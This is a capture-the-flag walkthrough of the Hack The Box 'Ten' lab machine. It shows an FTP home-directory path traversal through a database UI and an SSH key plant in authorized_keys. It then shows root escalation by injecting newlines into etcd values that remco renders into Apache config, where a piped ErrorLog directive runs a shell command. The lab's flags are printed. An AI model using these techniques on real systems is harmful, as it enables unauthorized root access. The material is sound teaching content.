---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Newline-Injection
  - remco
  - etcd
  - WebDB
  - Path-Traversal
---
# Overview

| Name        | Ten   |
| ----------- | ----- |
| OS          | Linux |
| Base Points | Hard  |
| Status      | Done  |
# Recon
## Nmap

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ sudo nmap -sC -sV 10.129.234.158
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-03 01:26 CST
Nmap scan report for 10.129.234.158
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 13:98:54:52:d3:7b:ae:32:6a:33:6f:18:a3:5a:27:66 (ECDSA)
|_  256 2e:d5:86:25:c1:6b:0e:51:a2:2a:dd:82:44:a6:00:63 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Page moved.
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration

![[ten3.png]]

![[ten4.png]]

We can use those creds to login to FTP but there is nothing.

Site is running PHP, FTP anonymous login fails. Directory fuzzing also lists nothing interesting.

```bash
ffuf -u http://10.129.234.158 -H "Host: FUZZ.ten.vl" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

We get `webdb.ten.vl`.

![[ten.png]]

![[ten2.png]]

Going into the `pureftpd` db, there is one table, `users`, and it has a bunch of accounts I created.

![[ten5.png]]
# Initial Foothold
## Path Traversal

#### Access /srv

I’ll try editing the `dir` value for an account I control. It seems each intended value is `/srv/<username>/./`. I can try just `/srv/./`, and it saves:

![[ten6.png]]

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ ftp ten-39a4b3e3@ten.vl
Connected to ten.vl.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 07:43. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User ten-39a4b3e3 OK. Password required
Password: 
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Extended Passive mode OK (|||37297|)
150 Accepted data connection
226-Options: -l 
226 0 matches total
ftp> 
```

We are one directory back so path traversal seems to work. To get to root save it as `/srv/../`

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ ftp ten-39a4b3e3@ten.vl
Connected to ten.vl.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 07:46. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User ten-39a4b3e3 OK. Password required
Password: 
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Extended Passive mode OK (|||11106|)
150 Accepted data connection
lrwxrwxrwx    1 0          root                7 Feb 16  2024 bin -> usr/bin
drwxr-xr-x    4 0          root             4096 Jun 24  2025 boot
dr-xr-xr-x    2 0          root             4096 Jul  2  2025 cdrom
drwxr-xr-x   19 0          root             4000 Jan  3 07:09 dev
drwxr-xr-x  107 0          root             4096 Jul  2  2025 etc
drwxr-xr-x    3 0          root             4096 Sep 28  2024 home
lrwxrwxrwx    1 0          root                7 Feb 16  2024 lib -> usr/lib
lrwxrwxrwx    1 0          root                9 Feb 16  2024 lib32 -> usr/lib32
lrwxrwxrwx    1 0          root                9 Feb 16  2024 lib64 -> usr/lib64
lrwxrwxrwx    1 0          root               10 Feb 16  2024 libx32 -> usr/libx32
drwx------    2 0          root            16384 Sep 28  2024 lost+found
drwxr-xr-x    2 0          root             4096 Feb 16  2024 media
drwxr-xr-x    2 0          root             4096 Feb 16  2024 mnt
drwxr-xr-x    3 0          root             4096 Sep 28  2024 opt
dr-xr-xr-x  290 0          root                0 Jan  3 07:09 proc
drwx------    7 0          root             4096 Jul  2  2025 root
drwxr-xr-x   33 0          root             1000 Jan  3 07:25 run
lrwxrwxrwx    1 0          root                8 Feb 16  2024 sbin -> usr/sbin
drwxr-xr-x    6 0          root             4096 Feb 16  2024 snap
drwxr-xr-x    2 0          root             4096 Feb 16  2024 srv
dr-xr-xr-x   13 0          root                0 Jan  3 07:09 sys
drwxrwxrwt   14 0          root             4096 Jan  3 07:39 tmp
drwxr-xr-x   14 0          root             4096 Feb 16  2024 usr
drwxr-xr-x   14 0          root             4096 Sep 28  2024 var
226-Options: -l 
226 24 matches total
```

But we cant do much here we dont have permissions.

```bash
ftp> cd etc
250 OK. Current directory is /etc
ftp> get passwd
local: passwd remote: passwd
229 Extended Passive mode OK (|||16308|)
150 Accepted data connection
100% |*****************************************************************************************|  1882        5.60 MiB/s    00:00 ETA
226-File successfully transferred
226 0.000 seconds (measured here), 29.99 Mbytes per second
1882 bytes received in 00:00 (3.08 MiB/s)
```

If we cat the passwd file we can see one user that is in home directory.

```bash
<snip>
tyrell:x:1000:1000:Tyrell W.:/home/tyrell:/bin/bash
<snip>
```

But we cant access `/home/tyrell`. We can see that tyrell UID and GID is 1000. So changed to that and saved.

![[ten7.png]]

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ ftp ten-39a4b3e3@ten.vl
Connected to ten.vl.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 07:51. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User ten-39a4b3e3 OK. Password required
Password: 
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Extended Passive mode OK (|||61516|)
150 Accepted data connection
lrwxrwxrwx    1 0          root                7 Feb 16  2024 bin -> usr/bin
drwxr-xr-x    4 0          root             4096 Jun 24  2025 boot
dr-xr-xr-x    2 0          root             4096 Jul  2  2025 cdrom
drwxr-xr-x   19 0          root             4000 Jan  3 07:09 dev
drwxr-xr-x  107 0          root             4096 Jul  2  2025 etc
drwxr-xr-x    3 0          root             4096 Sep 28  2024 home
lrwxrwxrwx    1 0          root                7 Feb 16  2024 lib -> usr/lib
lrwxrwxrwx    1 0          root                9 Feb 16  2024 lib32 -> usr/lib32
lrwxrwxrwx    1 0          root                9 Feb 16  2024 lib64 -> usr/lib64
lrwxrwxrwx    1 0          root               10 Feb 16  2024 libx32 -> usr/libx32
drwx------    2 0          root            16384 Sep 28  2024 lost+found
drwxr-xr-x    2 0          root             4096 Feb 16  2024 media
drwxr-xr-x    2 0          root             4096 Feb 16  2024 mnt
drwxr-xr-x    3 0          root             4096 Sep 28  2024 opt
dr-xr-xr-x  293 0          root                0 Jan  3 07:09 proc
drwx------    7 0          root             4096 Jul  2  2025 root
drwxr-xr-x   33 0          root             1000 Jan  3 07:25 run
lrwxrwxrwx    1 0          root                8 Feb 16  2024 sbin -> usr/sbin
drwxr-xr-x    6 0          root             4096 Feb 16  2024 snap
drwxr-xr-x    2 0          root             4096 Feb 16  2024 srv
dr-xr-xr-x   13 0          root                0 Jan  3 07:09 sys
drwxrwxrwt   14 0          root             4096 Jan  3 07:39 tmp
drwxr-xr-x   14 0          root             4096 Feb 16  2024 usr
drwxr-xr-x   14 0          root             4096 Sep 28  2024 var
226-Options: -l 
226 24 matches total
ftp> cd /home/tyler
550 Can't change directory to /home/tyler: No such file or directory
ftp> cd /home
250 OK. Current directory is /home
ftp> ls
229 Extended Passive mode OK (|||6142|)
150 Accepted data connection
drwxr-x---    4 1000       tyrell           4096 Jun 24  2025 tyrell
226-Options: -l 
226 1 matches total
ftp> cd tyrell
250 OK. Current directory is /home/tyrell
ftp> ls
229 Extended Passive mode OK (|||25787|)
150 Accepted data connection
226-Options: -l 
226 0 matches total
ftp> ls -la
229 Extended Passive mode OK (|||13191|)
150 Accepted data connection
drwxr-x---    4 1000       tyrell           4096 Jun 24  2025 .
drwxr-xr-x    3 0          root             4096 Sep 28  2024 ..
lrwxrwxrwx    1 0          root                9 Jun 24  2025 .bash_history -> /dev/null
-rw-r--r--    1 1000       tyrell            220 Jan  6  2022 .bash_logout
-rw-r--r--    1 1000       tyrell           3771 Jan  6  2022 .bashrc
drwx------    2 1000       tyrell           4096 Sep 28  2024 .cache
-rw-r--r--    1 1000       tyrell            807 Jan  6  2022 .profile
drwx------    2 1000       tyrell           4096 Sep 28  2024 .ssh
-r--------    1 1000       tyrell             33 Apr 11  2025 .user.txt
226-Options: -a -l 
226 9 matches total
```

Now we can access and get `.ssh` and SSH. But it isnt so easy.

```bash
ftp> get .user.txt
local: .user.txt remote: .user.txt
229 Extended Passive mode OK (|||18378|)
553 Prohibited file name: .user.txt
ftp> get user.txt
local: user.txt remote: user.txt
229 Extended Passive mode OK (|||64580|)
550 Can't open user.txt: No such file or directory
ftp> cd .ssh
553 Prohibited file name: .ssh
```

We cant get it so. I can’t `cd` into `.ssh`. There seems to be a block on anything that starts with `.`. But what if I try setting the base directory to `/home/tyrell/.ssh`? It works in the web DB UI:

![[ten8.png]]

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ ftp ten-39a4b3e3@ten.vl
Connected to ten.vl.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 07:55. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User ten-39a4b3e3 OK. Password required
Password: 
230 OK. Current directory is /home/tyrell/.ssh
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Extended Passive mode OK (|||19208|)
150 Accepted data connection
-rw-------    1 1000       tyrell            162 Sep 28  2024 authorized_keys
226-Options: -l 
226 1 matches total
```

With access to a potential `.ssh` folder, I’ll put my public SSH key into the `authorized_keys` file in that directory:

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ ssh-keygen -t rsa -b 4096
Generating public/private rsa key pair.
Enter file in which to save the key (/home/at0mxploit/.ssh/id_rsa): 
Created directory '/home/at0mxploit/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/at0mxploit/.ssh/id_rsa
Your public key has been saved in /home/at0mxploit/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:myK8u/gvi5hSbrRVPPQZK/Pcnzc0h808/N89cT8lgtI at0mxploit@htb-iuikcigcae
The key's randomart image is:
+---[RSA 4096]----+
|                 |
|      . .        |
|     o . +       |
|      * +        |
|     . *So .  .= |
|  o..   +oE . =+B|
| + oo . o. . + +B|
|.o+o.o .    o oo=|
|+.o.**.      . .B|
+----[SHA256]-----+
```

```bash
ftp> put ~/.ssh/id_rsa.pub authorized_keys
local: /home/at0mxploit/.ssh/id_rsa.pub remote: authorized_keys
229 Extended Passive mode OK (|||49999|)
150 Accepted data connection
100% |*****************************************************************************************|   751        7.45 MiB/s    00:00 ETA
226-File successfully transferred
226 0.244 seconds (measured here), 3.01 Kbytes per second
751 bytes sent in 00:00 (3.08 KiB/s)
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ ssh -i .ssh/id_rsa tyrell@ten.vl
The authenticity of host 'ten.vl (10.129.234.158)' can't be established.
ED25519 key fingerprint is SHA256:l6yrcdMcU34GxTUYFlSibADXTv2/Bd1AEnItyyI0jdg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ten.vl' (ED25519) to the list of known hosts.

 System information as of Sat Jan  3 07:58:34 AM UTC 2026

  System load:  0.07              Processes:             239
  Usage of /:   70.3% of 8.07GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 10.129.234.158
  Swap usage:   0%
tyrell@ten:~$ ls
tyrell@ten:~$ ls -la
total 32
drwxr-x--- 4 tyrell tyrell 4096 Jun 24  2025 .
drwxr-xr-x 3 root   root   4096 Sep 28  2024 ..
lrwxrwxrwx 1 root   root      9 Jun 24  2025 .bash_history -> /dev/null
-rw-r--r-- 1 tyrell tyrell  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 tyrell tyrell 3771 Jan  6  2022 .bashrc
drwx------ 2 tyrell tyrell 4096 Sep 28  2024 .cache
-rw-r--r-- 1 tyrell tyrell  807 Jan  6  2022 .profile
drwx------ 2 tyrell tyrell 4096 Sep 28  2024 .ssh
-r-------- 1 tyrell tyrell   33 Apr 11  2025 .user.txt
tyrell@ten:~$ cat .user.txt
a0a255ad63b7a26d83467fa6e0a6a757
```
# Privilege Escalation

```bash
tyrell@ten:~$ cd /var/www/html
tyrell@ten:/var/www/html$ ls
attribution.php  dist                                                images.txt  index.php  signup.php
carousel.css     get-credentials-please-do-not-spam-this-thanks.php  index.html  info.php
```

Only one file really have any PHP that executes, `get-credentials-please-do-not-spam-this-thanks.php`. This is where the POST requests to create a domain go.

It starts by making sure the `domain` POST parameter is set, and redirecting to `/signup.php` if not:

```
<?php
if ( !isset($_POST['domain']) ) {
  header('Location: /signup.php');
}
```

Then it checks for non alphanumeric characters in the domain, and returns a message if it finds any:

```
if(!preg_match('/^[0-9a-z]+$/', $_POST['domain'])) {
  echo('<font color=red>Domain name can only contain alphanumeric characters.</font>');
} else {
...[snip]...
}
```

If all is valid, it creates a username, random password, and connects to and updates the database:

```
} else {
  $username = "ten-" . substr(hash("md5",rand()),0,8);
  $password = substr(hash("md5",rand()),0,8);
  $password_crypt = crypt($password,'$1$OWNhNDE');
  sleep(10); // This is only here so that you do not create too many users :)
  $mysqli = new mysqli("127.0.0.1", "user", "pa55w0rd", "pureftpd");
  $stmt = $mysqli->prepare("INSERT INTO users VALUES ( NULL, ?, ?, ?, ?, ? );");
  $uid = random_int(2000,65535);
  $dir = "/srv/$username/./";
  $stmt->bind_param('ssiis',$username,$password_crypt,$uid,$uid,$dir);
  $stmt->execute();
  system("ETCDCTL_API=3 /usr/bin/etcdctl put /customers/$username/url " . $_POST['domain']);
  echo('<p class="lead">Your personal account is ready to be used:<br><br>Username: <b>'.$username.'</b><br>Password: <b>'.$password.'</b><br>Personal Domain: <b>'.$_POST['domain'].'.ten.vl</b><br><br>You can use the provided credentials to upload your pages<br> via ftp://ten.vl.<br><br><font size="-1">It may take up to one minute for all backend processes to properly identify you as well as your personal virtual host to be available.</font></p>');
}
```

Then it calls `system()` with the `etcdctl` command, and then writes the results to the response.
#### etcd

[etcd](https://etcd.io/) is a distributed key-value store. The docs have a page called [Interacting with etcd](https://etcd.io/docs/v3.4/dev-guide/interacting_v3/) that show how to use `etcdctl` to read and write from this store.

I can dump all the customer data using the `--prefix` flag:

```bash
tyrell@ten:/var/www/html$ ETCDCTL_API=3 etcdctl get /customers/ --prefix 
/customers/ten-39a4b3e3/url
at0m
```
#### remco

There’s a running process named `remco`:

```bash
tyrell@ten:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root         975  0.0  0.6 733880 24320 ?        Ssl  Jul21   1:02 /usr/local/sbin/remco
...[snip]...
```

[remco](https://github.com/HeavyHorst/remco) is a configuration management tool. There are configuration files in `/etc/remco`:

```bash
tyrell@ten:/etc/remco$ ls
config  templates
```

`config` defines what it is doing:

```
log_level = "info"
log_format = "text"

[[resource]]
name = "apache2"

[[resource.template]]
  src = "/etc/remco/templates/010-customers.conf.tmpl"
  dst = "/etc/apache2/sites-enabled/010-customers.conf"
  reload_cmd = "systemctl restart apache2.service"

  [resource.backend]
    [resource.backend.etcd]
      version = 3
      nodes = ["http://127.0.0.1:2379"]
      keys = ["/customers"]
      watch = true
      interval = 5
```

It’s looking at `etcd` and specifically the `/customers` key. Any time it changes (on an interval of 5 seconds), it will regenerate the `010-customers.conf` file from the provided template, and then run `systemctl restart apache2.service`.

`010-customers.conf.tmpl` is a `for` loop that generates a `VirtualHost` for each key in `/customers`:

```bash
{% for customer in lsdir("/customers") %}
  {% if exists(printf("/customers/%s/url", customer)) %}

<VirtualHost *:80>
        ServerName {{ getv(printf("/customers/%s/url",customer)) }}.ten.vl
        DocumentRoot /srv/{{ customer }}/
</VirtualHost>

  {% endif %}
{% endfor %}
```

I’ll test writing a simple key / value to `etcd` and seeing if it shows up in `010-customers.conf`:

```bash
tyrell@ten:/etc$ ETCDCTL_API=3 etcdctl put /customers/AAAA/url BBBB
OK
```

A few seconds later:

```
tyrell@ten:/etc$ cat apache2/sites-enabled/010-customers.conf | head -5

<VirtualHost *:80>
        ServerName BBBB.ten.vl
        DocumentRoot /srv/AAAA/
</VirtualHost>
```
### Shell

#### Newline Injection

If I can put newlines into the `etcd` values, then I can inject parameters into the Apache config file. I’ll start with a simple test that hopefully won’t break Apache when it restarts:

```bash
tyrell@ten:~$ ETCDCTL_API=3 etcdctl put /customers/ten-1291b4cb/url 'privesc.ten.vl
‍         # test here
‍         #'
OK
```

It works:

```bash
tyrell@ten:~$ head /etc/apache2/sites-enabled/010-customers.conf | head

<VirtualHost *:80>
        ServerName privesc.ten.vl
        # test here
        #.ten.vl
        DocumentRoot /srv/ten-1291b4cb/
</VirtualHost>
```
#### Piped Logs

I used comments above so that Apache wouldn’t break on restarting. Now it’s time to research execution methods. An interesting trick is to use [Piped Logs](https://httpd.apache.org/docs/2.4/logs.html#piped). This is meant to allow running a command like `rotatelogs` on the log when writing to it with something like:

```
CustomLog "|/usr/local/apache/bin/rotatelogs /var/log/access_log 86400" common
```

I’ll write a directive to copy the `authorized_keys` file from tyrell to root:

```bash
tyrell@ten:~$ ETCDCTL_API=3 /usr/bin/etcdctl put /customers/final-attack/url 'attack.ten.vl
ErrorLog "|/bin/sh -c \"mkdir -p /root/.ssh && cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys\""
#'
OK
tyrell@ten:~$ grep -A5 'attack.ten.vl' /etc/apache2/sites-enabled/010-customers.conf
	ServerName attack.ten.vl
ErrorLog "|/bin/sh -c \"mkdir -p /root/.ssh && cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys\""
#.ten.vl
	DocumentRoot /srv/final-attack/
</VirtualHost>

tyrell@ten:~$ sleep 10

```

Now I can SSH into Ten:

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ ssh -i .ssh/id_rsa root@ten.vl

 System information as of Sat Jan  3 08:19:36 AM UTC 2026

  System load:  0.07              Processes:             235
  Usage of /:   70.0% of 8.07GB   Users logged in:       1
  Memory usage: 12%               IPv4 address for eth0: 10.129.234.158
  Swap usage:   0%
Last login: Wed Jul  2 12:28:21 2025
root@ten:~# cat /root/root.txt
d89266bde1e8cfe1cd70194bd899d2e7
```

---
